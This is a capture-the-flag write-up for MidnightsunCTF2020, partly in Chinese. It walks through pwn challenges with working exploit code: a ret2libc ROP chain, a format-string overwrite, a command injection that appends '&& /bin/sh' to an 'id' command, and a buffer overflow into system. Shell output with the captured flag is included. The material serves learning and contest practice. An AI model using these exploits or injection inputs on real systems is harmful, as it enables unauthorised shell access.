# MidnightsunCTF2020
* link: [https://ctf.midnightsunctf.se/](https://ctf.midnightsunctf.se/)
* country: Sweden
* team: TaQini@[Nepnep](https://ctftime.org/team/106104) 

## pwn1 (70pt)
### Description

> An homage to pwny.racing, we present... speedrun pwn challenges.
> These bite-sized challenges should serve as a nice warm-up for your pwning skills.


### Attachment

[pwn1](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/MidnightsunCTF2020/pwn/pwn1/pwn1), [libc](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/MidnightsunCTF2020/pwn/pwn1/libc.so)

### Analysis

just an general warming up task of ret2libc attack

### Solution

#### leak libc 

**ASLR** is enabled, so leak libc first:

```python
# elf, libc
main = 0x00400698

# rop1
offset = cyclic_find(0x61616173)
payload = cyclic(offset)
payload += p64(prdi) + p64(elf.got['puts']) + p64(elf.sym['puts']) + p64(main)

ru('buffer: ')
# debug()
sl(payload)
```

#### calculate baseaddr

we can calculate the base address of libc by `puts-libc.sym['puts']` after `puts` in libc was leaked

```python
puts = uu64(rc(6))
info_addr("puts",puts)
libcbase = puts-libc.sym['puts']
```

address of other function/string in libc can be calculated as follow:

```python
system = libcbase+libc.sym['system']
binsh  = libcbase+libc.search('/bin/sh').next()
```

#### getshell

finally, execute `system('/bin/sh')`

```python
# rop2
ru('buffer: ')
payload = cyclic(offset)
payload += p64(ret) + p64(prdi) + p64(binsh) + p64(system) + p64(main)
# debug()
sl(payload)
```

### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/MidnightsunCTF2020/pwn/pwn1) 

## pwn2 (80pt)

## pwn3 (91pt)

## pwn4 (172pt, unsolved)

- 题目描述：
  
    > An homage to pwny.racing, we present... speedrun pwn challenges. These bite-sized challenges should serve as a nice warm-up for your pwning skills.
- 题目附件：[pwn4](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/MidnightsunCTF2020/pwn/pwn4/pwn4)
- 考察点：格式化字符串
- 难度：好难呀
- 初始分值：100
- 最终分值：172
- 完成人数：28

### 程序分析

限制十分苛刻的一个格式化字符串漏洞，字符串长度只有13：

![](http://image.taqini.space/img/2020-04-05_19-09.png)

* `v10`是`mmap+mprotect`的一个随机整数，只读

* 格式化字符串漏洞在`log_attempt`中

* `v8`等于`v10`时给shell，但是`v8`是个4位数，基本上等于不了`v10`

* `v10`在栈中可以通过`%25$p`泄漏，`v8`也在栈中可通过`%16$n`修改

* 程序是32位静态编译的，没有GOT表可改
* 格式化字符串长度为13，且只能用一次

### 解题思路

由于漏洞只能利用一次，所以必须在**泄漏`v10`的同时修改`v8`**，比赛的时候找了半天也不知道怎么搞...

而且如果用常规的`%<N>c`的方法去修改`v8`（`N`的长度在`1-10`之间），`13`字节的字符串根本不够用...  

> `|(·_·) |·_·) |_·) |·) | )` 太难了...

赛后看[wp](https://ctftime.org/writeup/19333?c=4566)，学到了新姿势：

> Basic idea:
> Copy the secret (4 bytes) from the stack to our guess variable (also on the stack) and pass the check.
>
> `%<N>d`   normally this lets us print N characters total (a decimal int padded to N spaces).
> `%*25$d`  lets us choose the value of N from the stack, we choose 25$ -> position of the secret value, this will therefore print a number of chars equal to the secret value.
> `%16$n`   will write the number of printed chars to our variable on the stack (position 16) that is then compared with the secret.
>
> This will print **A LOT** of characters back (like 500MB of spaces), but works after trying a few times!

------

#### 记笔记！`*`的用法

* `%<N>d`这个很常用，打印长度为N的字符串，和`%<N>c`差不多

* `%*25$d`从栈中取变量作为`N`

  > 比如`25$`处的值是`0x100`，那么这个格式化字符串就相当于`%256d`

那么可以理解为`*`相当于c语言取值符号...嘛？刨根问底一下，查看`man`文档，找到`*`的用方法：

![](http://image.taqini.space/img/20200405185627.png)

根据文档写个栗子：

```c
int main(){
    int width=10;
    int num=2333;
    puts("\ncase1:");
    printf("%*d", width, num);    
    puts("\ncase2:");
    printf("%2$*1$d", width, num);
}
```

输出如下：

```
case1:
      2333
case2:
      2333
```

#### 小结

* `*`如果单独使用，则**按顺序**取参数列表中的参数
* `*`如果配合`$`使用，则取参数列表中**相应位置**的参数，如`*1$`
* 取出的参数将格式化为**十进制数**，用作限制**字符串宽度**

#### 用途

* 缩短格式化字符串长度

------

回到题目，`%*25$d%16$n`可以把`v10`的值直接复制给`v8`

用`%n`可能会一次打印好多字符，不过多试几次，当`v10`很小的时候很快的打印完了

写exp时可以使用`pwntools`的`clean`函数接受数据

### exp

```python
fmt = "%*25$d%16$n"
sla('user: ',fmt)
#debug('b *0x08048a63')
sla('code: ','2333')

p.clean(10)
p.interactive()
```

> clean(10): **接受全部数据**并**清空缓冲区**，timeout为10秒

## pwn5 (176pt, unsolved)

## pwn6 (135pt, unsolved)

## Admpanel (58pt)

### Description

> We found this legacy admin panel. Someone has patched it though :( 

### Attachment

[admpanel](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/MidnightsunCTF2020/pwn/admpanel/admpanel)

### Analysis

`system(&s)` was called in following code:

```c
  if ( !strncmp(&s, "id", 2uLL) )
    return system(&s);
```

> it just compare the first 2 bytes of `s`

### Solution


So, we can input `id && /bin/sh` to getshell

``` shell
$ nc admpanel-01.play.midnightsunctf.se 31337
---=-=-=-=-=-=-=-=-=---
-      Admin panel    -
-
- [0] - Help
- [1] - Authenticate
- [2] - Execute command
- [3] - Exit
---=-=-=-=-=-=-=-=-=---
 > 1
  Input username: admin
  Input password: password
 > 2
  Command to execute: id && /bin/sh
uid=999(ctf) gid=999(ctf) groups=999(ctf)
ls -al
total 32
drwxr-xr-x 1 root ctf   4096 Apr  3 05:41 .
drwxr-xr-x 1 root root  4096 Apr  3 05:41 ..
-rwxr-x--- 1 root ctf  14408 Apr  3 13:09 chall
-r--r----- 1 root ctf     41 Apr  2 21:20 flag
-rwxr-x--- 1 root ctf     71 Apr  2 21:20 redir.sh
cat flag
midnight{n3v3r_4sk_b0bb_to_d0_S0m3TH4Ng}
```


## Admpanel2 (85pt)

### Description

> Oops, they patched it again!

### Attachment

[admpanel2](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/MidnightsunCTF2020/pwn/admpanel2/admpanel2)

### Analysis

In func `sub_40121A`, `maxlen` is an unsigned integer, if the return value of `snprintf` is nearly `0x100`, after 3 times `maxlen -= n` executed , maxlen will be a great integer. Buffer overflow will happen after input a long string.

```c
  maxlen = 0x100LL;
  n = snprintf(&buf, 0x100uLL, "LOG: [OPERATION: %s] ", a1, a2);
  if ( n < 0 )
    exit(1);
  ptr += n;
  maxlen -= n;         // first 
  if ( authed )        // authed=1 after [1]auth 
  {
    n = snprintf(ptr, maxlen, "[USERNAME: %s] ", var_138);
    if ( n < 0 )
      exit(1);
    ptr += n;
    maxlen -= n;      // second 
  }
  if ( *var_rsp )
  {
    n = snprintf(ptr, maxlen, "%s", var_rsp);
    if ( n < 0 )
      exit(1);
    ptr += n;
    maxlen -= n;      // thrid, bof here
  }
  fprintf(stderr, "%s\n", &buf);
```

> bof is enable while `authed=1` 

This elf64 program use format string `%s` to print our input string to `ptr`(in stack) , so only one gadget can be used beacuse bad code `\x00` in address of gadget will terminal our input. 

>  ROP is not a good idea.

But ret2text is still available, only one gadget is enough: 

```nasm
.text:0000000000401598  mov     rdi, rax        ; command
.text:000000000040159B  call    _system
```

Before ret2text ,we should set `rax` point to `"/bin/sh"`. This work can be done by selected [1]auth one more time and set the begining of username to `"/bin/sh;"`.

### Solution

```python
system = 0x000000000401598 

# elf, libc
satck = 0x4040E0+0x100
# rop1
offset = 282
payload = ''
payload += 'A'*offset
payload += p64(system)
payload = payload.ljust(1000,'\0')

# auth flag = 1
sla(' > ','1')
sla('  Input username: ','admin'+'a'*1000)
sla('  Input password: ','password233')

# rax <- /bin/sh;
sla(' > ','1')
sla('  Input username: ','/bin/sh;'+'b'*1000)

sla(' > ','2')
# debug('b *0x4015A1\nb *0x040121A')
sla('  Command to execute: ',payload)

p.interactive()
```

> focus on the layout of regs is helpful while pwning ---

### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/MidnightsunCTF2020/pwn/admpanel2) 